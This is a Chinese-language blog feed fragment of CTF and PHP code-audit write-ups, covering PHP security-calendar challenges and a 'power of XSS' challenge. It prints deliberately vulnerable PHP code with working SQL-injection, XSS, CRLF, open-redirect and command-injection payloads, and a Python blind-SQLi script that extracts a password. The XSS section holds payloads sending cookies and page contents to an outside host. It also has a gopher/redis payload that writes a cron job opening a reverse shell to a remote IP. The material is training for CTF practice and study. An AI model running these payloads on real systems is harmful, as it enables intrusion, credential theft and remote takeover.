但是第二个参数的默认配置会不编码单引号，这就导致了这里单引号被闭合 payload:?a&#39;onclick=alert(1)//=c 红日安全提供的ctf题：https://github.com/hongriSec/PHP-Audit-Labs/tree/master/Part1/Day12/files1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phprequire &apos;db.inc.php&apos;;if(isset($_REQUEST[&apos;username&apos;]))&#123; if(preg_match(&quot;/(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i&quot;, $_REQUEST[&apos;username&apos;]))&#123; die(&quot;Attack detected!!!&quot;); &#125;&#125;if(isset($_REQUEST[&apos;password&apos;]))&#123; if(preg_match(&quot;/(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i&quot;, $_REQUEST[&apos;password&apos;]))&#123; die(&quot;Attack detected!!!&quot;); &#125;&#125;function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET[&apos;username&apos;]);$password = @clean((string)$_GET[&apos;password&apos;]);$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;echo $query;$result=mysql_query($query,$con);//var_dump($result);while($row = mysql_fetch_array($result))&#123; echo &quot;&lt;tr&gt;&quot;; echo &quot;&lt;td&gt;&quot; . $row[&apos;name&apos;] . &quot;&lt;/td&gt;&quot;; echo &quot;&lt;/tr&gt;&quot;;&#125;?&gt; 和之前不一样的是，这里同样用了htmlentities进行编码转换，这里配置了ENT_QUOTES，使得单双引号都会被转义，无法闭合sql语句。但是因为没有过滤\，使得我们可以转义单引号： 后来看wp还有一种有意思思路：https://xz.aliyun.com/t/2829#toc-4 仔细看我们会发现过滤的时候使用的是$_REQUEST来获取参数，而获取查库操作的变量以$_GET形式引入，这里有一个看似不起眼的差异。 在php.ini中，因为$_REQUEST和gpc有共同之处，而下图中GPCS即$_REQUEST加载流程,G:Get，P:Post，C:Cookie，S:Server。 可以知道post在get之后，如果我们同时传入get和post相同参数，则$_REQUEST获取到的是post，固然我们就可以利用这个点绕过过滤限制。 Day 13 - Turkey Baster123456789101112131415161718192021222324252627282930313233343536class LoginManager &#123; private $em; private $user; private $password; public function __construct($user, $password) &#123; $this-&gt;em = DoctrineManager::getEntityManager(); $this-&gt;user = $user; $this-&gt;password = $password; &#125; public function isValid() &#123; $user = $this-&gt;sanitizeInput($this-&gt;user); $pass = $this-&gt;sanitizeInput($this-&gt;password); $queryBuilder = $this-&gt;em-&gt;createQueryBuilder() -&gt;select(&quot;COUNT(p)&quot;) -&gt;from(&quot;User&quot;, &quot;u&quot;) -&gt;where(&quot;user = &apos;$user&apos; AND password = &apos;$pass&apos;&quot;); $query = $queryBuilder-&gt;getQuery(); return boolval($query-&gt;getSingleScalarResult()); &#125; public function sanitizeInput($input, $length = 20) &#123; $input = addslashes($input); if (strlen($input) &gt; $length) &#123; $input = substr($input, 0, $length); &#125; return $input; &#125;&#125;$auth = new LoginManager($_POST[&apos;user&apos;], $_POST[&apos;passwd&apos;]);if (!$auth-&gt;isValid()) &#123; exit;&#125; 其实这个点和day12有相似之处，这段代码虽然使用了addslashes()函数来转义引号，问题出在他会用substr()截断长度大于20的部分，所以我们可以像day12中一样，利用substr将\&#39;的&#39;给截断掉，导致转义原本的单引号，然后就可以注入了。当然这类漏洞局限就是一般存在于双条件查询的页面。 红日安全提供的练习题：https://xz.aliyun.com/t/2864 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?phprequire &apos;db.inc.php&apos;; function dhtmlspecialchars($string) &#123; if (is_array($string)) &#123; foreach ($string as $key =&gt; $val) &#123; $string[$key] = dhtmlspecialchars($val); &#125; &#125; else &#123; $string = str_replace(array(&apos;&amp;&apos;, &apos;&quot;&apos;, &apos;&lt;&apos;, &apos;&gt;&apos;, &apos;(&apos;, &apos;)&apos;), array(&apos;&amp;amp;&apos;, &apos;&amp;quot;&apos;, &apos;&amp;lt;&apos;, &apos;&amp;gt;&apos;, &apos;（&apos;, &apos;）&apos;), $string); if (strpos($string, &apos;&amp;amp;#&apos;) !== false) &#123; $string = preg_replace(&apos;/&amp;amp;((#(\d&#123;3,5&#125;|x[a-fA-F0-9]&#123;4&#125;));)/&apos;, &apos;&amp;\\1&apos;, $string); &#125; &#125; return $string; &#125; function dowith_sql($str) &#123; $check = preg_match(&apos;/select|insert|update|delete|\&apos;|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/is&apos;, $str); if ($check) &#123; echo &quot;非法字符!&quot;; exit(); &#125; return $str; &#125; // 经过第一个waf处理 foreach ($_REQUEST as $key =&gt; $value) &#123; $_REQUEST[$key] = dowith_sql($value); // 用相同参数的$_POST去覆盖掉$_GET &#125; // 经过第二个WAF处理 $request_uri = explode(&quot;?&quot;, $_SERVER[&apos;REQUEST_URI&apos;]); // 这里拿到的是$_GET if (isset($request_uri[1])) &#123; $rewrite_url = explode(&quot;&amp;&quot;, $request_uri[1]); foreach ($rewrite_url as $key =&gt; $value) &#123; $_value = explode(&quot;=&quot;, $value); if (isset($_value[1])) &#123; $_REQUEST[$_value[0]] = dhtmlspecialchars(addslashes($_value[1])); // 没过滤键，只过滤了value &#125; &#125; &#125; // 业务处理 if (isset($_REQUEST[&apos;submit&apos;])) &#123; $user_id = $_REQUEST[&apos;i_d&apos;]; $sql = &quot;select * from phpAuditLabs.users where id=$user_id&quot;; echo $sql; $result=mysql_query($sql); while($row = mysql_fetch_array($result)) &#123; echo &quot;&lt;tr&gt;&quot;; echo &quot;&lt;td&gt;&quot; . $row[&apos;name&apos;] . &quot;&lt;/td&gt;&quot;; echo &quot;&lt;/tr&gt;&quot;; &#125; &#125;?&gt; 同样也是$_REQUEST获取参数覆盖问题同day12，相同参数名时$_POST会覆盖掉$_GET，而在其处理$_SERVER[&#39;REQUEST_URI&#39;]再一次对uri中的参数给$_REQUEST进行注册，并且没有校验sql注入。 这里还有一种解法就是利用http参数污染漏洞，思路和day14一致。 Day 14 - Snowman考点：变量覆盖及目录遍历getshell 123456789101112131415161718192021222324&lt;?phpclass Carrot &#123;const EXTERNAL_DIRECTORY = &apos;/tmp/&apos;;private $id;private $lost = 0;private $bought = 0;public function __construct($input) &#123;$this-&gt;id = rand(1, 1000);foreach ($input as $field =&gt; $count) &#123;$this-&gt;$field = $count++;&#125;&#125;public function __destruct() &#123;file_put_contents(self::EXTERNAL_DIRECTORY . $this-&gt;id,var_export(get_object_vars($this), true));&#125;&#125;$carrot = new Carrot($_GET); payload:../11.php&amp;shell=1&#39;,)%0a&lt;%3fphp+phpinfo();?&gt;// 红日安全提供的ctf题： https://pan.baidu.com/s/1pHjOVK0Ib-tjztkgBxe3nQ 密码: 59t2 这个题的漏洞关键在于$_SERVER[&#39;REQUEST_URI&#39;]和$_GET处理空格、.、[的差异造成。 $_GET变量在处理参数的时候，会将参数名中的空格、.、[替换成_，而$_SERVER[&#39;REQUEST_URI&#39;]不会，这就在注册变量的时候产生了一个差异。这种漏洞称为HPP（HTTP Parameter Pollution）demo: payload:?message_id=-1 union select 1,flag,3,4 from flag&amp;message.id=1 嫖的原理图： Day 15 - Sleigh Ride $_SERVER[&#39;PHP_SELF&#39;]配合一些特殊的url解析模式(如PATH_INFO)导致的漏洞 1234567891011121314151617181920212223class Redirect &#123; private $websiteHost = &apos;www.example.com&apos;; private function setHeaders($url) &#123; $url = urldecode($url); header(&quot;Location: $url&quot;); &#125; public function startRedirect($params) &#123; $parts = explode(&apos;/&apos;, $_SERVER[&apos;PHP_SELF&apos;]); $baseFile = end($parts); $url = sprintf( &quot;%s?%s&quot;, $baseFile, http_build_query($params) ); $this-&gt;setHeaders($url); &#125;&#125;if ($_GET[&apos;redirect&apos;]) &#123; (new Redirect())-&gt;startRedirect($_GET[&apos;params&apos;]);&#125; 这里如果URL是PATH_INFO的时候，比如https://demo.com/index.php/admin实际上还是访问的index.php这样的入口文件。比如：https://demo.com/index.php/https://baidu.com，$_SERVER[&#39;PHP_SELF&#39;]获取到的是/index.php/https://baidu.com，而这里会explode处理/，取数组的最后一个作为 $baseFile，由于代码中设置header()前有一次url解码，这就导致了我们可以二次url编码绕过这个/限制，payload：https://demo.com/index.php/http:%252f%252fbaidu.com?redirect=1&amp;params[a]=1 这样就产生了一个url跳转漏洞。 红日安全提供的ctf题：https://xz.aliyun.com/t/3178 1234567891011121314151617181920212223242526272829&lt;?php include &quot;./config.php&quot;;include &quot;./flag.php&quot;;error_reporting(0);$black_list = &quot;/admin|guest|limit|by|substr|mid|like|or|char|union|select|greatest|%00|\&apos;|&quot;;$black_list .= &quot;=|_| |in|&lt;|&gt;|-|chal|_|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i&quot;;if(preg_match($black_list, $_GET[&apos;user&apos;])) exit(&quot;:P&quot;); if(preg_match($black_list, $_GET[&apos;pwd&apos;])) exit(&quot;:P&quot;); $query=&quot;select user from users where user=&apos;$_GET[user]&apos; and pwd=&apos;$_GET[pwd]&apos;&quot;;echo &quot;&lt;h1&gt;query : &lt;strong&gt;&lt;b&gt;&#123;$query&#125;&lt;/b&gt;&lt;/strong&gt;&lt;br&gt;&lt;/h1&gt;&quot;;$result = $conn-&gt;query($query);if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); if($row[&apos;user&apos;]) echo &quot;&lt;h2&gt;Welcome &#123;$row[&apos;user&apos;]&#125;&lt;/h2&gt;&quot;;&#125;$result = $conn-&gt;query(&quot;select pwd from users where user=&apos;admin&apos;&quot;);if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); $admin_pass = $row[&apos;pwd&apos;];&#125;if(($admin_pass)&amp;&amp;($admin_pass === $_GET[&apos;pwd&apos;]))&#123; echo $flag;&#125;highlight_file(__FILE__);?&gt; 很明显是sql注入的绕过，仔细分析过滤规则可以发现没有过滤\，因为是双条件查询这样就可以闭合引号了。这里需要注出admin的密码就能拿flag。 payload：?user=\&amp;pwd=||/**/pwd/**/REGEXP/**/&quot;^8&quot;;%00 exp:12345678910111213141516import stringimport requestsimport rechar_set = &apos;0123456789abcdefghijklmnopqrstuvwxyz_&apos;pw = &apos;&apos;while 1: for ch in char_set: url = &apos;https://localhost/CTF/?user=\\&amp;pwd=||pwd/**/regexp/**/&quot;^%s&quot;;%%00&apos; r = requests.get(url=url%(pw+ch)) if &apos;Welcome Admin&apos; in r.text: pw += ch print(pw) break if ch == &apos;_&apos;: breakr = requests.get(&apos;https://localhost/CTF/?user=&amp;pwd=%s&apos; % pw)print(re.findall(&apos;HRCTF&#123;\S&#123;1,50&#125;&#125;&apos;,r.text)[0]) 这种注入方式局限在于只能指定同一表中的其他字段。 Day 16 - Poem1234567891011121314151617181920212223242526272829303132333435class FTP &#123; public $sock; public function __construct($host, $port, $user, $pass) &#123; $this-&gt;sock = fsockopen($host, $port); $this-&gt;login($user, $pass); $this-&gt;cleanInput(); $this-&gt;mode($_REQUEST[&apos;mode&apos;]); $this-&gt;send($_FILES[&apos;file&apos;]); &#125; private function cleanInput() &#123; $_GET = array_map(&apos;intval&apos;, $_GET); $_POST = array_map(&apos;intval&apos;, $_POST); $_COOKIE = array_map(&apos;intval&apos;, $_COOKIE); &#125; public function login($username, $password) &#123; fwrite($this-&gt;sock, &quot;USER &quot; . $username . &quot;\n&quot;); fwrite($this-&gt;sock, &quot;PASS &quot; . $password . &quot;\n&quot;); &#125; public function mode($mode) &#123; if ($mode == 1 || $mode == 2 || $mode == 3) &#123; fputs($this-&gt;sock, &quot;MODE $mode\n&quot;); &#125; &#125; public function send($data) &#123; fputs($this-&gt;sock, $data); &#125;&#125;new FTP(&apos;localhost&apos;, 21, &apos;user&apos;, &apos;password&apos;); $_REQUEST[&#39;mode&#39;]获取数据未经过滤+弱类型比较payload:?mode=1%0a%0dDELETE%20test.file Day 17 - Mistletoemd5($this-&gt;password, true)绕过addslashes1234567891011121314151617181920212223242526272829303132333435class RealSecureLoginManager &#123; private $em; private $user; private $password; public function __construct($user, $password) &#123; $this-&gt;em = DoctrineManager::getEntityManager(); $this-&gt;user = $user; $this-&gt;password = $password; &#125; public function isValid() &#123; $pass = md5($this-&gt;password, true); $user = $this-&gt;sanitizeInput($this-&gt;user); $queryBuilder = $this-&gt;em-&gt;createQueryBuilder() -&gt;select(&quot;COUNT(p)&quot;) -&gt;from(&quot;User&quot;, &quot;u&quot;) -&gt;where(&quot;password = &apos;$pass&apos; AND user = &apos;$user&apos;&quot;); $query = $queryBuilder-&gt;getQuery(); return boolval($query-&gt;getSingleScalarResult()); &#125; public function sanitizeInput($input) &#123; return addslashes($input); &#125;&#125;$auth = new RealSecureLoginManager( $_POST[&apos;user&apos;], $_POST[&apos;passwd&apos;]);if (!$auth-&gt;isValid()) &#123; exit;&#125; 所有的输入数据都被addslashes过滤了一遍，这里看似没有办法闭合sql语句的引号，其实这里问题出在md5()函数上：https://php.net/manual/zh/function.md5.php 如果第二个参数设置为true，则以原始的二进制数据返回。 那么有没有可能让md5($string, true),最后一位出现\呢。 跑出来md5(&quot;128&quot;,true);的最后一位为\123456789&lt;?phpfor($i=1; $i&lt;9999; $i++)&#123; $string = md5($i,true); if(substr($string,-1) == &quot;\\&quot;)&#123; echo $i.&quot;\n&quot;.$string; break; &#125;&#125; 之后的注入流程就和前面所述一致了。 还有一些比较有意思的点比如：md5(&quot;ffifdyop&quot;,true); // &#39;or&#39;6�]��!r,��bmd5(&quot;129581926211651571912466741651878684928&quot;,true); // �T0D��o#��&#39;or&#39;8 可以用来绕过这样的场景：12原先：SELECT * FROM admin WHERE username = &apos;admin&apos; and password = &apos;md5($password,true)&apos;变成：SELECT * FROM admin WHERE username = &apos;admin&apos; and password = &apos;&apos;or&apos;6\xc9]\x99&apos; and优先级比or高，导致整个where子句为真，即必然会出数据。 红日安全分享了一道这个考点的题：https://xz.aliyun.com/t/3375 Day 18 - Sign123456789101112class JWT &#123; public function verifyToken($data, $signature) &#123; $pub = openssl_pkey_get_public(&quot;file://pub_key.pem&quot;); $signature = base64_decode($signature); if (openssl_verify($data, $signature, $pub)) &#123; $object = json_decode(base64_decode($data)); $this-&gt;loginAsUser($object); &#125; &#125;&#125;(new JWT())-&gt;verifyToken($_GET[&apos;d&apos;], $_GET[&apos;s&apos;]); Day 19 - Birch123456789101112131415161718192021222324252627class ImageViewer &#123; private $file; function __construct($file) &#123; $this-&gt;file = &quot;images/$file&quot;; $this-&gt;createThumbnail(); &#125; function createThumbnail() &#123; $e = stripcslashes( preg_replace( &apos;/[^0-9\\\]/&apos;, &apos;&apos;, isset($_GET[&apos;size&apos;]) ? $_GET[&apos;size&apos;] : &apos;25&apos; ) ); system(&quot;/usr/bin/convert $this-&gt;file --resize $e ./thumbs/$this-&gt;file&quot;); &#125; function __toString() &#123; return &quot;&lt;a href=$this-&gt;file&gt; &lt;img src=./thumbs/$this-&gt;file&gt;&lt;/a&gt;&quot;; &#125;&#125;echo (new ImageViewer(&quot;image.png&quot;)); 只允许数字，且会将转义符去除，这里可以使用8进制绕过限制：0\073\163\154\145\145\160\0405\073 Day 20 - Stocking1234567891011121314151617181920212223242526272829303132&lt;?phpset_error_handler(function ($no, $str, $file, $line) &#123; throw new ErrorException($str, 0, $no, $file, $line);&#125;, E_ALL);class ImageLoader&#123; public function getResult($uri) &#123; if (!filter_var($uri, FILTER_VALIDATE_URL)) &#123; return &apos;&lt;p&gt;Please enter valid uri&lt;/p&gt;&apos;; &#125; try &#123; $image = file_get_contents($uri); $path = &quot;./images/&quot; . uniqid() . &apos;.jpg&apos;; file_put_contents($path, $image); if (mime_content_type($path) !== &apos;image/jpeg&apos;) &#123; unlink($path); return &apos;&lt;p&gt;Only .jpg files allowed&lt;/p&gt;&apos;; &#125; &#125; catch (Exception $e) &#123; return &apos;&lt;p&gt;There was an error: &apos; . $e-&gt;getMessage() . &apos;&lt;/p&gt;&apos;; &#125; return &apos;&lt;img src=&quot;&apos; . $path . &apos;&quot; width=&quot;100&quot;/&gt;&apos;; &#125;&#125;echo (new ImageLoader())-&gt;getResult($_GET[&apos;img&apos;]); ssrf无过滤，只能盲打，或者通过报错来看： Day 21 - Gift Wrap123456789101112131415161718192021222324252627282930313233declare(strict_types=1);class ParamExtractor &#123; private $validIndices = []; private function indices($input) &#123; $validate = function (int $value, $key) &#123; if ($value &gt; 0) &#123; $this-&gt;validIndices[] = $key; &#125; &#125;; try &#123; array_walk($input, $validate, 0); &#125; catch (TypeError $error) &#123; echo &quot;Only numbers are allowed as input&quot;; &#125; return $this-&gt;validIndices; &#125; public function getCommand($parameters) &#123; $indices = $this-&gt;indices($parameters); $params = []; foreach ($indices as $index) &#123; $params[] = $parameters[$index]; &#125; return implode($params, &apos; &apos;); &#125;&#125;$cmd = (new ParamExtractor())-&gt;getCommand($_GET[&apos;p&apos;]);system(&apos;resizeImg image.png &apos; . $cmd); 命令执行，绕过类型转换，本地没复现成功.. Day 22 - Chimney12345678910111213141516if (isset($_POST[&apos;password&apos;])) &#123; setcookie(&apos;hash&apos;, md5($_POST[&apos;password&apos;])); header(&quot;Refresh: 0&quot;); exit;&#125;$password = &apos;0e836584205638841937695747769655&apos;;if (!isset($_COOKIE[&apos;hash&apos;])) &#123; echo &apos;&lt;form&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;&apos; . &apos;&lt;input type=&quot;submit&quot; value=&quot;Login&quot; &gt;&lt;/form &gt;&apos;; exit;&#125; elseif (md5($_COOKIE[&apos;hash&apos;]) == $password) &#123; echo &apos;Login succeeded&apos;;&#125; else &#123; echo &apos;Login failed&apos;;&#125; 很明显，简单的md5若类型比较漏洞:]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[The power of XSS WriteUp]]></title>
    <url>%2F2019%2F02%2F10%2FThe%20power%20of%20XSS%20WriteUp%2F</url>
    <content type="text"><![CDATA[学习了一下xss-&gt;ssrf-&gt;redis level 1不知道为啥，xss平台一直打不到手动就可以..payload:&lt;svg/onload=&quot;document.location=&#39;https://dyfuca.ceye.io/?&#39;+document.cookie&quot;&gt; flag:FLAG{Sometimes, XSS can be critical vulnerability &lt;script&gt;alert(1)&lt;/script&gt;} 给了我们一个管理员的session，提示我们flag2要打内网的redis。 level 2修改成admin的session后： 打源码123&lt;svg/onload=&quot;document.location=&apos;https://dyfuca.ceye.io/?&apos;+btoa(document.body.innerHTML&quot;) // 过滤了()&lt;svg/onload=&quot;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#100;&amp;#121;&amp;#102;&amp;#117;&amp;#99;&amp;#97;&amp;#46;&amp;#99;&amp;#101;&amp;#121;&amp;#101;&amp;#46;&amp;#105;&amp;#111;&amp;#47;&amp;#63;&amp;#39;&amp;#43;&amp;#98;&amp;#116;&amp;#111;&amp;#97;&amp;#40;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#98;&amp;#111;&amp;#100;&amp;#121;&amp;#46;&amp;#105;&amp;#110;&amp;#110;&amp;#101;&amp;#114;&amp;#72;&amp;#84;&amp;#77;&amp;#76;&amp;#41&quot;&gt; 看源码看到一个request.php，让bot去访问一下，打一下html的源码。 123456789101112&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&apos;https://155.94.177.154:55555/?&apos;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;GET&quot;,&quot;request.php&quot;,true);xmlhttp.send();&quot;&gt; 实体编码：1&lt;svg/onload=&quot;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#61;&amp;#110;&amp;#101;&amp;#119;&amp;#32;&amp;#88;&amp;#77;&amp;#76;&amp;#72;&amp;#116;&amp;#116;&amp;#112;&amp;#82;&amp;#101;&amp;#113;&amp;#117;&amp;#101;&amp;#115;&amp;#116;&amp;#40;&amp;#41;&amp;#59;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#111;&amp;#110;&amp;#114;&amp;#101;&amp;#97;&amp;#100;&amp;#121;&amp;#115;&amp;#116;&amp;#97;&amp;#116;&amp;#101;&amp;#99;&amp;#104;&amp;#97;&amp;#110;&amp;#103;&amp;#101;&amp;#61;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#10;&amp;#123;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#105;&amp;#102;&amp;#32;&amp;#40;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#114;&amp;#101;&amp;#97;&amp;#100;&amp;#121;&amp;#83;&amp;#116;&amp;#97;&amp;#116;&amp;#101;&amp;#61;&amp;#61;&amp;#52;&amp;#32;&amp;#38;&amp;#38;&amp;#32;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#115;&amp;#116;&amp;#97;&amp;#116;&amp;#117;&amp;#115;&amp;#61;&amp;#61;&amp;#50;&amp;#48;&amp;#48;&amp;#41;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#123;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#49;&amp;#53;&amp;#53;&amp;#46;&amp;#57;&amp;#52;&amp;#46;&amp;#49;&amp;#55;&amp;#55;&amp;#46;&amp;#49;&amp;#53;&amp;#52;&amp;#58;&amp;#53;&amp;#53;&amp;#53;&amp;#53;&amp;#53;&amp;#47;&amp;#63;&amp;#39;&amp;#43;&amp;#98;&amp;#116;&amp;#111;&amp;#97;&amp;#40;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#114;&amp;#101;&amp;#115;&amp;#112;&amp;#111;&amp;#110;&amp;#115;&amp;#101;&amp;#84;&amp;#101;&amp;#120;&amp;#116;&amp;#41;&amp;#59;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#125;&amp;#10;&amp;#125;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#40;&amp;#34;&amp;#71;&amp;#69;&amp;#84;&amp;#34;&amp;#44;&amp;#34;&amp;#114;&amp;#101;&amp;#113;&amp;#117;&amp;#101;&amp;#115;&amp;#116;&amp;#46;&amp;#112;&amp;#104;&amp;#112;&amp;#34;&amp;#44;&amp;#116;&amp;#114;&amp;#117;&amp;#101;&amp;#41;&amp;#59;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#115;&amp;#101;&amp;#110;&amp;#100;&amp;#40;&amp;#41;&amp;#59&quot;&gt; 解码后： 所以我们给request.php传入的post参数为url=ip 结合robot.txt提示，读config.php。 payload:12345678910111213&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&apos;https://155.94.177.154:55555/?&apos;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;url=file:///var/www/html/config.php&quot;);&quot;&gt; 编码后，打到 flag2:FLAG{curl -v -o flag --next flag://in-the.redis/the?port=25566&amp;good=luck} level 3提示我们打内网redis，redis协议使用的是简单的文本流。比如下面发送的tcp流数据，每行代表一条命令，下面是两个set命令12SET x 1SET y 2 显然，如果是get型的ssrf他无法控制单独的一行(除非有crlf漏洞)，p神这篇文章提到了这个点：https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html 所以这里得用Gopher协议，可以以get形式发起post请求 用popherus生成了个弹shell的payload：1gopher://localhost:25566/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2469%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/155.94.177.154/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A payload: 12345678910111213&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&apos;https://155.94.177.154:5555/?&apos;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2469%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/155.94.177.154/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A&quot;);&quot;&gt; 但是弹不回来.. exp:12345678910111213&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&apos;https://155.94.177.154:55556/?&apos;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_lrange%2520flag%25200%252053%250a_quit&quot;);&quot;&gt; 处理一下flag格式1234567891011121314# coding:utf-8file = open(&quot;flag.txt&quot;)tmp = []while 1: line = file.readline() tmp.append(line.replace(&quot;\n&quot;, &quot;&quot;)) if not line: break passflag = &quot;&quot;for i in range(0, tmp.__len__())[::-1]: flag += tmp[i] print(flag) 再附上处理验证码的脚本：1234567891011121314import hashlib strs = &apos;00000&apos;def md5(s): return hashlib.md5(str(s).encode(&apos;utf-8&apos;)).hexdigest()def main(): for i in range(100000,100000000): tmp = &quot;3f81ef4c8455e281&quot;+str(i) a = md5(tmp) if a[0:5] == strs: print(i) exit(0) if __name__ == &apos;__main__&apos;: main()]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LCTF 2018 Babyphp's revenge]]></title>
    <url>%2F2019%2F02%2F10%2FLCTF%202018%20Babyphp's%20revenge%2F</url>
